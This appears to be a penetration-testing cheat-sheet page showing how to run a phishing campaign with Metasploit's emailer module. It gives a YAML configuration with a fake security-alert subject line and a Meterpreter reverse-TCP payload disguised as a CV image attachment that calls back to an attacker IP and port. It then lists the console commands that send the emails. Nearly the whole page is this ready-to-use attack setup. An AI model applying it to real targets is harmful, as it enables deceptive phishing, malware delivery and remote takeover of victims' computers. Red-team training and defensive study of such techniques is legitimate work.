# Metasploit

## YAML Configuration File

Fill in the required configurations by preparing a phishing campaign.

```yaml
# Emails CSV File (Fname Lname,email)
to: /path/to/emails.csv
# Email is sent from this address
from: attacker@metasf.com
# Subject
subject: "[SECURITY-ALERT] Critical Windows Vulnerability"
# Type ( text or text/html )
type: text/html
# Msg body file
msg_file: /path/to/message_body.txt
# Number of seconds to wait before next email
wait: 5
# Prepend the first name to the email body
add_name: true
# Add custom signature from file
sig: true
# Signature file
sig_file: /path/to/sig.txt
```

Attachment information.

```yaml
# Add an email attachment (File exploit anyone?) 
attachment: true
# Path to file attachment
attachment_file: /path/to/payload.jpg
# Name of file attachment
attachment_file_name: CV_Application.jpg
# Type of attachment
attachment_file_type: image/jpeg
```

Generate payload automatically in metasploit.

```yaml
# create a metasploit payload
make_payload: true
# zip the payload
zip_payload: true
# metasploit server ip
msf_ip: <attacker_IP>
# metasploit server port
msf_port: <attacker_PORT>
# metasploit payload
msf_payload: windows/x64/meterpreter/reverse_tcp
# metasploit payload
msf_filename: payload.exe
# metasploit location
msf_location: /usr/share/metasploit-framework
# change the extension
msf_change_ext: true
# new extension
msf_payload_ext: vxe
```

## Send Phishing Email

```
msf > use auxiliary/client/smtp/emailer

msf auxiliary(client/smtp/emailer) > options

Module options (auxiliary/client/smtp/emailer):

   Name         Current Setting                                           Required  Description
   ----         ---------------                                           --------  -----------
   DATE                                                                   no        Override the DATE: field with this value
   DOMAIN                                                                 no        SMTP Domain to EHLO to
   MAILFROM     random@example.com                                        yes       The FROM address of the e-mail
   PASSWORD                                                               no        SMTP Password for sending email
   RHOST        127.0.0.1                                                 yes       SMTP server address
   RHOSTS       127.0.0.1                                                 yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
   RPORT        25                                                        yes       SMTP server port (TCP)
   USERNAME                                                               no        SMTP Username for sending email
   VERBOSE                                                                no        Display verbose information
   YAML_CONFIG  /usr/share/metasploit-framework/data/emailer_config.yaml  yes       Full path to YAML Configuration file

msf auxiliary(client/smtp/emailer) > set rhost <attacker_mailserver_IP>

msf auxiliary(client/smtp/emailer) > set rhosts <target_mailserver_IP>

msf auxiliary(client/smtp/emailer) > set mailfrom no-reply@attacker.com

msf auxiliary(client/smtp/emailer) > set yaml_config /path/to/emailer_config.yaml

msf auxiliary(client/smtp/emailer) > run
```